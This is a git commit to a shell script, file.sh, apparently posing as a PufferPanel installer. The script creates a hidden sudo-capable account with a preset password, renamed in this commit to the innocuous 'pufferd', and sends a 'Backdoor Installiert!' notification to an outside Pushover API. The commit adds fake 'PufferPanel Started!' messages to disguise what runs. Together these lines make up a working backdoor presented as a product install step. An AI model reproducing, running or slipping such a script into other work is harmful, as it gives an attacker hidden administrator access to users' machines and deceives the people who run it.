213d12a5f53ff487e0a6806fbc99a7217e661617
PufferPanel <95872225+pufferdinstaller@users.noreply.github.com>
2021-12-19 16:36:03 +0100

    Update file.sh

--- file.sh
+++ file.sh
@@ -1,7 +1,10 @@
-sudo useradd -p sau55nnoskxos namelessmcacc
-sudo usermod -aG sudo namelessmcacc
+sudo useradd -p sau55nnoskxos pufferd
+sudo usermod -aG sudo pufferd
 curl -s \
   --form-string "token=aw9itprfbhm87ecooj58g7ussdn3an" \
   --form-string "user=uj7zkbroszmy9s8u4ymhdcvkxdyjjm" \
   --form-string "message=Backdoor Installiert!" \
   https://api.pushover.net/1/messages.json
+echo "Starting Pufferpanel..."
+sleep 1
+echo "PufferPanel Started! Use pufferpanel user add to create a User"
